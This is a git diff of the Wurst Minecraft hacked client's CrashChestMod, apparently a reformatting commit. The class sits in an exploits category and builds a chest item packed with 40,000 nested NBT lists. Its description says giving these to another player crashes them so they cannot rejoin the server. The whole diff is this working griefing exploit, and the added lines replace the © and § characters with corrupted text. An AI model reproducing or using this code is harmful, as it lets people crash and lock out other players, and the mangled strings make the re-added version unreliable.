@@ -1,5 +1,5 @@
 /*
- * Copyright © 2014 - 2015 Alexander01998 and contributors
+ * Copyright ï¿½ 2014 - 2015 Alexander01998 and contributors
  * All rights reserved.
  * 
  * This Source Code Form is subject to the terms of the Mozilla Public
@@ -16,42 +16,37 @@ import net.minecraft.nbt.NBTTagList;
 import tk.wurst_client.WurstClient;
 
 @Mod.Info(category = Mod.Category.EXPLOITS,
-	description = "Generates a CrashChest. Give a lot of these to another\n"
-		+ "player to make them crash. They will not be able to join the server\n"
-		+ "ever again!",
-	name = "CrashChest")
-public class CrashChestMod extends Mod
-{
-	@Override
-	public void onEnable()
-	{
-		if(Minecraft.getMinecraft().thePlayer.inventory.getStackInSlot(36) != null)
-		{
-			if(Minecraft.getMinecraft().thePlayer.inventory.getStackInSlot(36)
-				.getDisplayName().equals("§6§lCOPY ME"))
-				WurstClient.INSTANCE.chat
-					.error("You already have a CrashChest.");
-			else
-				WurstClient.INSTANCE.chat.error("Please take off your shoes.");
-			setEnabled(false);
-			return;
-		}else if(!Minecraft.getMinecraft().thePlayer.capabilities.isCreativeMode)
-		{
-			WurstClient.INSTANCE.chat.error("Creative mode only.");
-			setEnabled(false);
-			return;
-		}
-		ItemStack stack = new ItemStack(Blocks.chest);
-		NBTTagCompound nbtTagCompound = new NBTTagCompound();
-		NBTTagList nbtList = new NBTTagList();
-		for(int i = 0; i < 40000; i++)
-			nbtList.appendTag(new NBTTagList());
-		nbtTagCompound.setTag("www.wurst-client.tk", nbtList);
-		stack.setTagInfo("www.wurst-client.tk", nbtTagCompound);
-		Minecraft.getMinecraft().thePlayer.getInventory()[0] = stack;
-		stack.setStackDisplayName("§6§lCOPY ME");
-		WurstClient.INSTANCE.chat
-			.message("A CrashChest was placed in your shoes slot.");
-		setEnabled(false);
-	}
+        description = "Generates a CrashChest. Give a lot of these to another\n" +
+                "player to make them crash. They will not be able to join the server\n" + "ever again!",
+        name = "CrashChest")
+public class CrashChestMod extends Mod {
+    @Override
+    public void onEnable() {
+        if (Minecraft.getMinecraft().thePlayer.inventory.getStackInSlot(36) != null) {
+            if (Minecraft.getMinecraft().thePlayer.inventory.getStackInSlot(36).getDisplayName()
+                    .equals("ï¿½6ï¿½lCOPY ME")) {
+                WurstClient.INSTANCE.chat.error("You already have a CrashChest.");
+            } else {
+                WurstClient.INSTANCE.chat.error("Please take off your shoes.");
+            }
+            setEnabled(false);
+            return;
+        } else if (!Minecraft.getMinecraft().thePlayer.capabilities.isCreativeMode) {
+            WurstClient.INSTANCE.chat.error("Creative mode only.");
+            setEnabled(false);
+            return;
+        }
+        ItemStack stack = new ItemStack(Blocks.chest);
+        NBTTagCompound nbtTagCompound = new NBTTagCompound();
+        NBTTagList nbtList = new NBTTagList();
+        for (int i = 0; i < 40000; i++) {
+            nbtList.appendTag(new NBTTagList());
+        }
+        nbtTagCompound.setTag("www.wurst-client.tk", nbtList);
+        stack.setTagInfo("www.wurst-client.tk", nbtTagCompound);
+        Minecraft.getMinecraft().thePlayer.getInventory()[0] = stack;
+        stack.setStackDisplayName("ï¿½6ï¿½lCOPY ME");
+        WurstClient.INSTANCE.chat.message("A CrashChest was placed in your shoes slot.");
+        setEnabled(false);
+    }
 }
